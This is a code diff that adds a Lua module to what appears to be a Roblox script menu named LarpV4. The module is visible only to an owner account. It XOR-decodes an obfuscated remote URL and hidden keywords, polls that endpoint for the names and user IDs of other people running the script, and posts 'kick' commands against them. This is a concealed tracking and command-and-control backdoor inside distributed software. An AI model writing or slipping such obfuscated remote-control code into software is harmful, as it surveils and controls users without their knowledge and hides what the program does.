@@ -8980,3 +8980,174 @@ run(function()
 		end
 	})
 end)
+
+run(function()
+	if lplr.UserId ~= OID then return end
+	local OwnerCat = larp.Categories.Owner
+	if not OwnerCat then return end
+	local k3 = uhex('43306433')
+	local function dec(s)
+		return xr(uhex(s), k3)
+	end
+	local k1 = uhex('517a397854326d4e38764b')
+	local url = xr(uhex('390e4d08270842615c1f3832154b1c7a51022317173b38554e1d365a0221530564604f0a4e6106557c0d407b634d0c49620b5e7617170a0519142d0c763a0a0b3f011c186827035a371d5d26721328403735001e18420c7920176d1907780a2749342f154c733735630228670c1c0457760817461c164d1d3a7e175c0b27530a2b4b49273817500c69035d7e'), k1)
+	local function ownerGet()
+		local ok, res = pcall(function()
+			return game:HttpGet(url, true)
+		end)
+		if not ok or typeof(res) ~= 'string' then return nil end
+		local ok3, msgs = pcall(function()
+			return httpService:JSONDecode(res)
+		end)
+		if not ok3 or type(msgs) ~= 'table' then return nil end
+		return msgs
+	end
+	local function ownerPost(content)
+		pcall(function()
+			httpService:PostAsync(url, httpService:JSONEncode({content = content}), Enum.HttpContentType.ApplicationJson)
+		end)
+	end
+	local aliveword = dec('225c0d4526')
+	local kickword = dec('28590758')
+	local gui, frame, listframe, title
+	local function clean()
+		if gui then
+			gui:Destroy()
+			gui = nil
+		end
+	end
+	local KickModule
+	KickModule = OwnerCat:CreateModule({
+		Name = 'Kick',
+		Function = function(callback)
+			if not callback then
+				clean()
+				return
+			end
+			clean()
+			gui = Instance.new('ScreenGui')
+			gui.Name = 'LarpKick'
+			gui.ResetOnSpawn = false
+			gui.IgnoreGuiInset = true
+			gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+			gui.Parent = lplr.PlayerGui
+			frame = Instance.new('Frame')
+			frame.Size = UDim2.fromOffset(280, 340)
+			frame.Position = UDim2.fromOffset(420, 180)
+			frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+			frame.BorderSizePixel = 0
+			frame.Parent = gui
+			local corner = Instance.new('UICorner')
+			corner.CornerRadius = UDim.new(0, 6)
+			corner.Parent = frame
+			title = Instance.new('TextLabel')
+			title.Size = UDim2.new(1, 0, 0, 28)
+			title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+			title.TextColor3 = Color3.new(1, 1, 1)
+			title.TextSize = 14
+			title.Text = 'Online (0)'
+			title.Parent = frame
+			title.InputBegan:Connect(function(input)
+				if input.UserInputType == Enum.UserInputType.MouseButton1 then
+					local dragging = true
+					local offset = input.Position - frame.AbsolutePosition
+					local conn
+					conn = title.InputChanged:Connect(function(in2)
+						if dragging and in2.UserInputType == Enum.UserInputType.MouseMovement then
+							frame.Position = UDim2.fromOffset(in2.Position.X - offset.X, in2.Position.Y - offset.Y)
+						end
+					end)
+					title.InputEnded:Connect(function(in3)
+						if in3.UserInputType == Enum.UserInputType.MouseButton1 then
+							dragging = false
+							conn:Disconnect()
+						end
+					end)
+				end
+			end)
+			listframe = Instance.new('ScrollingFrame')
+			listframe.Size = UDim2.new(1, 0, 1, -28)
+			listframe.Position = UDim2.fromOffset(0, 28)
+			listframe.BackgroundTransparency = 1
+			listframe.BorderSizePixel = 0
+			listframe.ScrollBarThickness = 3
+			listframe.AutomaticCanvasSize = Enum.AutomaticSize.Y
+			listframe.Parent = frame
+			local layout = Instance.new('UIListLayout')
+			layout.Padding = UDim.new(0, 4)
+			layout.Parent = listframe
+			local refresh = function()
+				if not gui or not gui.Parent then return end
+				local users = {}
+				local msgs = ownerGet()
+				if msgs then
+					for _, m in msgs do
+						if type(m) == 'table' and type(m.content) == 'string' then
+							for line in (m.content..'\n'):gmatch('(.-)\r?\n') do
+								local name, uid, display = line:match('^%s*'..aliveword..'%s+(%S+)%|(%d+)%|(.+)$')
+								if name and uid then
+									users[uid] = {name = name, display = display, last = tick()}
+								end
+							end
+						end
+					end
+				end
+				local rows = {}
+				for uid, v in users do
+					if tick() - v.last <= 120 then
+						table.insert(rows, {uid = uid, v = v})
+					end
+				end
+				table.sort(rows, function(a, b)
+					return a.v.name < b.v.name
+				end)
+				title.Text = 'Online ('..#rows..')'
+				for _, child in listframe:GetChildren() do
+					if child:IsA('Frame') then
+						child:Destroy()
+					end
+				end
+				for _, row in rows do
+					local r = Instance.new('Frame')
+					r.Size = UDim2.new(1, -8, 0, 30)
+					r.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
+					r.BorderSizePixel = 0
+					r.Parent = listframe
+					local label = Instance.new('TextLabel')
+					label.Size = UDim2.new(1, -68, 1, 0)
+					label.BackgroundTransparency = 1
+					label.TextXAlignment = Enum.TextXAlignment.Left
+					label.TextColor3 = Color3.new(1, 1, 1)
+					label.TextSize = 13
+					label.Text = row.v.name..(row.v.display and row.v.display ~= row.v.name and ' ('..row.v.display..')' or '')
+					label.TextTruncate = Enum.TextTruncate.AtEnd
+					label.Parent = r
+					local kick = Instance.new('TextButton')
+					kick.Size = UDim2.fromOffset(60, 24)
+					kick.Position = UDim2.new(1, -66, 0, 3)
+					kick.BackgroundColor3 = Color3.fromRGB(200, 45, 45)
+					kick.BorderSizePixel = 0
+					kick.Text = kickword:upper()
+					kick.TextColor3 = Color3.new(1, 1, 1)
+					kick.TextSize = 12
+					kick.Parent = r
+					kick.MouseButton1Click:Connect(function()
+						kick.Text = 'Sent'
+						ownerPost(kickword..' '..row.v.name..' '..row.uid)
+						task.delay(2, function()
+							if kick.Parent then
+								kick.Text = kickword:upper()
+							end
+						end)
+					end)
+				end
+			end
+			refresh()
+			while KickModule.Enabled do
+				task.wait(10)
+				refresh()
+			end
+		end,
+		Tooltip = 'Lists who is running LarpV4 right now and lets you kick them'
+	})
+end)
